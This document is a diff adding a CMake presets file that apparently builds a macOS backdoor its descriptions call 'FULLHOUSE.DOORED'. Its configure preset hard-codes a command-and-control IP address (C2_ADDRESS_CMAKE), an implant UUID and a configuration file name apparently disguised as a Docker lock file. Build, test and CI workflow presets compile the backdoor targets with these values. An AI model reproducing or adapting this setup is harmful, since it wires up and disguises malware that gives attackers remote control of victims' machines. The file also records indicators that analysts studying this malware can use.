@@ -1,0 +1,114 @@
+{
+  "version": 6,
+  "cmakeMinimumRequired": {
+    "major": 3,
+    "minor": 26,
+    "patch": 0
+  },
+  "configurePresets": [
+    {
+      "name": "default",
+      "binaryDir": "${sourceDir}/build",
+      "installDir": "${sourceDir}/install",
+      "generator": "Ninja Multi-Config",
+      "architecture": {
+        "value": "x64",
+        "strategy": "external"
+      },
+      "cacheVariables": {
+        "CMAKE_MODULE_PATH": "${sourceDir}/cmake",
+        "CMAKE_CXX_STANDARD": "26",
+        "CMAKE_C_STANDARD": "23",
+        "CMAKE_OSX_ARCHITECTURES": "x86_64",
+        "CMAKE_CONFIGURATION_TYPES": "Debug;Release;",
+        "CMAKE_CXX_COMPILER": "/usr/bin/clang++"
+      },
+      "environment": {
+        "C2_ADDRESS_CMAKE": "199.88.44.44",
+        "UUID_CMAKE": "01A48A493AC92607E79CB427067C0A42",
+        "CONFIG_FILE_NAME_CMAKE": "com.docker.sock.lock"
+      },
+      "condition": {
+        "type": "equals",
+        "lhs": "${hostSystemName}",
+        "rhs": "Darwin"
+      }
+    }
+  ],
+  "buildPresets": [
+    {
+      "name": "release",
+      "description": "Build FULLHOUSE.DOORED targets with release configuration",
+      "configurePreset": "default",
+      "inheritConfigureEnvironment": true,
+      "configuration": "Release",
+      "targets": [
+        "main",
+        "fullhouse-test"
+      ]
+    },
+    {
+      "name": "debug",
+      "description": "Build FULLHOUSE.DOORED targets with debug configuration",
+      "configurePreset": "default",
+      "inheritConfigureEnvironment": true,
+      "configuration": "Debug",
+      "targets": [
+        "main",
+        "fullhouse-test"
+      ]
+    }
+  ],
+  "testPresets": [
+    {
+      "name": "fullhouse",
+      "configurePreset": "default",
+      "configuration": "Debug",
+      "inheritConfigureEnvironment": true
+    },
+    {
+      "name": "all",
+      "configurePreset": "default",
+      "configuration": "Debug",
+      "inheritConfigureEnvironment": true
+    }
+  ],
+  "workflowPresets": [
+    {
+      "name": "cicd-debug",
+      "description": "Build all FULLHOUSE.DOORED debug targets",
+      "steps": [
+        {
+          "type": "configure",
+          "name": "default"
+        },
+        {
+          "type": "build",
+          "name": "debug"
+        },
+        {
+          "type": "test",
+          "name": "all"
+        }
+      ]
+    },
+    {
+      "name": "cicd-release",
+      "description": "Build all FULLHOUSE.DOORED release targets",
+      "steps": [
+        {
+          "type": "configure",
+          "name": "default"
+        },
+        {
+          "type": "build",
+          "name": "release"
+        },
+        {
+          "type": "test",
+          "name": "all"
+        }
+      ]
+    }
+  ]
+}
